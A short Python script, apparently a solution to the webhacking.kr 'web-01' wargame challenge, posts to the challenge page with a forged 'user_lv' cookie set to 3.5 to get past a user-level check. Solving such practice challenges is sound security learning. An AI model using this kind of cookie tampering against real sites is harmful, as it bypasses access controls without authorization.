import requests
import hashlib


URL = "https://webhacking.kr/challenge/web-01/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID, 'user_lv':"3.5" }

response = requests.post(URL, cookies=cookies)
print(response.text)

    